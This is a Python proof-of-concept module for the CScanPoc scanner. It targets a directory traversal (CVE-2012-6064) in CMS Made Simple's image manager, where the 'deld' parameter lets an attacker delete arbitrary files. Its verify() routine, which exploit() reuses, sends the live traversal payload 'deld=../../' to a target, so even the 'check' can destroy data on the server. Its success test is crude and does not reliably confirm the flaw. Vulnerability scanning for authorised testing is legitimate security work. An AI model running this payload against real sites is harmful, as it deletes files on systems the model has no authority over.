# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CMSMS_0101'  # 平台漏洞编号
    name = 'CMS Made Simple(CMSMS)目录遍历'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2012-12-04'  # 漏洞公布时间
    desc = '''模版漏洞描述
    CMS Made Simple(简称CMSMS)是一款优秀的轻量级开源内容管理系统(CMS)。
    CMS Made Simple (CMSMS)1.11.2.1之前版本中的lib/filemanager/imagemanager/images.php脚本中存在目录遍历漏洞。
    远程认证攻击者利用该漏洞通过deld参数中的（..），删除任意文件。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2012-7709'  # 漏洞来源
    cnvd_id = 'CNVD-2012-7709'  # cnvd漏洞编号
    cve_id = 'CVE-2012-6064'  # cve编号
    product = 'CMSMS'  # 漏洞组件名称
    product_version = '0.9.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '26daf47c-fcbc-4711-89cc-90bcf2061761'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-07-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/lib/filemanager/imagemanager/images.php?deld=../../"
            vul_url = self.target + payload
            _response = requests.get(vul_url)
            if _response.code == 200 and "404" not in _response.text and "Not Found" not in _response.text and "未找到" not in _response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
